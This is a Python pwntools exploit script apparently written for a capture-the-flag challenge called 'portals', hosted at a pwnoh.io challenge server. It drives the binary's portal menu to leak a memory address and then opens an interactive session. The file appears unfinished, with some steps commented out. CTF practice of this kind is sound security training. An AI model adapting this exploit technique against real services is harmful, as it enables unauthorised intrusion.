#!/usr/bin/env python3

from pwn import *

exe = ELF("./portals")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, '''
                c
            ''')
    else:
        r = remote("pwn.chall.pwnoh.io", 13374)

    return r


r = conn()


def leaveMessage(data):
    r.sendline(b'm')
    r.sendline(str(math.ceil(len(data) / 16)).encode())
    r.sendline(data)


def closePortal(year):
    r.sendline(b'c')
    r.sendline(str(year).encode())


def openPortal(year):
    r.sendline(b'o')
    r.sendline(str(year).encode())


def takePortal(year):
    r.sendline(b't')
    r.sendline(str(year).encode())


def recvaddress():
    return int.from_bytes(r.recvn(8), 'little')


def main():
    leaveMessage(b'A'*3)

    openPortal(1)
    openPortal(2)
    takePortal(2)

    leaveMessage(b'A'*16)
    openPortal(1)
    takePortal(1)

    openPortal(2022)
    openPortal(2)
    closePortal(2)
    r.recvuntil(b'They say:\n')
    r.recvuntil(b'They say:\n')
    r.recvuntil(b'They say:\n')
    r.recvuntil(b'They say:\n')
    r.recvuntil(b'They say:\n')
    r.recvuntil(b'They say:\n')
    r.recvuntil(b'They say:\n')
    by = recvaddress()
    log.info(f"{hex(by)=}")
    takePortal(2022)

    # closePortal(2)
    # takePortal(2022)

    r.interactive()


if __name__ == "__main__":
    main()
